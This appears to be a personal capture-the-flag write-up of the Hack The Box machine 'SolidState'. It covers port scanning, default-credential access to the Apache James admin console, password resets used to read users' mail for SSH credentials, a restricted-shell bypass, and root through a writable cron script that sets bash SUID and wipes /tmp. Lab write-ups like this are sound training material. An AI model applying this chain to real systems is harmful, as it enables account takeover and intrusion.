
### Initial access

We scan nmap and see that we have port 4555
```
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ cat nmap_ports.txt                                           
# Nmap 7.99 scan initiated Fri Sep  4 04:40:33 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt 10.129.39.149
Nmap scan report for 10.129.39.149 (10.129.39.149)
Host is up (0.13s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip


```

![[Assets/Pasted image 20260904165306.png]]



Searching  in google we see rce cve

```
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ searchsploit Apache James Server 2.3.2
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                                        | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                                                        | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                                              | linux/remote/50347.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ searchsploit -m linux/remote/50347.py 
  Exploit: Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)
      URL: https://www.exploit-db.com/exploits/50347
     Path: /usr/share/exploitdb/exploits/linux/remote/50347.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/HTB/SolidState/50347.py


```
We change user pass to read mail info from pop3 to have more info to have ssh cred
```
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ nc 10.129.39.149 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands

Unknown command 
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
setpassword james 123
Password for james reset

```

We see james inbox is blank so we continue to read other mail box
```
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ telnet 10.129.39.149 110
Trying 10.129.39.149...
Connected to 10.129.39.149.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
PASS 123
LIST          +OK
+OK Welcome james

+OK 0 0

```

```
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ telnet 10.129.39.149 110
Trying 10.129.39.149...
Connected to 10.129.39.149.
Escape character is '^]'.
USER  mindy
PASS 123
LIST   
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
+OK Welcome mindy
+OK 2 1945
1 1109
2 836
.
RETR 1 
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2 
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

```

We have ssh cred `mindy:P@55W0rd1!2@`
We using this to by pass restisted host
```
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ ssh mindy@10.129.39.168  -t "bash --noprofile"
mindy@10.129.39.168's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 

```

### Priv escalation

We check mishandling file by root
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -user root -perm -o+w -type f -print 2>/dev/null
/opt/tmp.py

```

We modify the script to get root shell
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/*;chmod +s /bin/bash ')
except:
     sys.exit()
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ /bin/bash -p
bash-4.4# id
uid=1001(mindy) gid=1001(mindy) euid=0(root) egid=0(root) groups=0(root),1001(mindy)
bash-4.4# 

```
### Post exploit